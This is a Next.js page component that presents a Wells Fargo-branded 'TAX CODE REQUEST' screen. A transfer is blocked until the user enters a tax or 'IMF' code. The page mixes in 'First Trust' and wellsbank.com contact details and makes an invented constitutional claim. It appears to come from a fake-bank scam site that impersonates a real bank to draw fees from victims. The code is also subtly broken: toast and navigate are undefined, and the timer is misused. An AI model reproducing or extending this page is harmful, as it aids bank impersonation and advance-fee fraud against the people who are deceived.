"use client";
import { useState } from "react";
import useSession from "../../../lib/use-session";
import { getUser } from "../../../lib/requests";
import Link from "next/link";
import Sidebar from "../../../components/dashboardComponents/Sidebar";
import { MdOutlineMenu } from "react-icons/md";
import "../request.css";
import { v4 as uuidv4 } from "uuid";
import Spinner from "../../../components/Spinner/Spinner";

export default function Tax() {
  const [taxCode, setTaxCode] = useState();
  const [showSideBar, setShowSideBar] = useState(false);
  const { session } = useSession();

  const { user, isLoading } = getUser(session?.username);

  const userId = session?.username;

  const getFromLocalStorage = () => {
    if (typeof window !== "undefined") {
      const value = localStorage.getItem("transferData")
        ? JSON.parse(localStorage.getItem("transferData"))
        : {};

      return value;
    }
  };

  const transferData = getFromLocalStorage();

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (user?.tax_code !== taxCode) {
      toast.error("Invalid IMF Code");
    } else if (user?.tax_code === taxCode) {
      // dispatch(updateTax(user.id));
      await fetch("/api/user/update/tax", {
        method: "PUT",
        body: JSON.stringify(userId),
      });

      // dispatch(updateBalance(transferData?.amount));
      await fetch(`/api/user/transaction/${userId}`, {
        method: "PUT",
        body: JSON.stringify({
          amount: transferData?.amount,
          balance: user?.balance,
        }),
      });

      // dispatch(createTransaction(trans));
      const res = await fetch("/api/user/transaction", {
        method: "POST",
        body: JSON.stringify({
          sendBy: userId,
          amount: transferData?.amount,
          accountName: transferData?.accountName,
          accountNumber: transferData?.accountNumber,
          remark: transferData?.remark,
          date: Date.now(),
          transactionId: uuidv4(),
        }),
      });
      if (res.ok) {
        toast.success("You have Successfully Deposited");
      }

      localStorage.removeItem("transferData");

      const timer = setTimeout(() => {
        navigate("/transactions");
      }, 1000);
      timer();
      clearTimeout(timer);
    }
  };

  if (isLoading) {
    return <Spinner />;
  }

  return (
    <div className="dashboard__container">
      <div className="dashboard__content">
        <Sidebar showSideBar={showSideBar} setShowSideBar={setShowSideBar} />
        <div className="dashboard__right">
          <nav className="dashboard__navbar">
            <h2>WELLS FARGO</h2>
            <div
              className="menu__content menu"
              onClick={() => setShowSideBar(true)}
            >
              <MdOutlineMenu />
            </div>
          </nav>
          <div className="request">
            <h2
              style={{
                paddingTop: "10px",
                fontWeight: "500",
              }}
              className="main__header"
            >
              TAX CODE REQUEST:
            </h2>
            <p style={{ fontSize: "13px" }}>
              Input TAX code to Continue Transaction Process
            </p>
            <p style={{ fontSize: "13px" }}>
              I don't have my TAX Code. Contact First Trust Customer Care via
              email: <Link href="/contact">customer_care@wellsbank.com</Link>
            </p>

            <div className="code__body">
              <h3>TAX Code</h3>
              <form className="dashboard__form__group" onSubmit={handleSubmit}>
                <div className="form__group">
                  <input
                    onChange={(e) => setTaxCode(e.target.value)}
                    type="text"
                    required
                  />
                  <label htmlFor="">Input TAX code</label>
                </div>
                <div className="form__group reqBtn">
                  <button style={{ backgroundColor: "#0a2d7e" }}>
                    CONTINUE
                  </button>
                </div>
              </form>

              <div className="form__group reqBtn">
                <Link href="/transfer">
                  <button className="red_btn">
                    GO BACK TO FUNDS TRASFER PAGE
                  </button>
                </Link>
              </div>

              <p className="code__footer">
                TAX Request is in accordance to the Constitutional Laws of the
                United States governing the transfer of funds to or from a
                foreign account
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
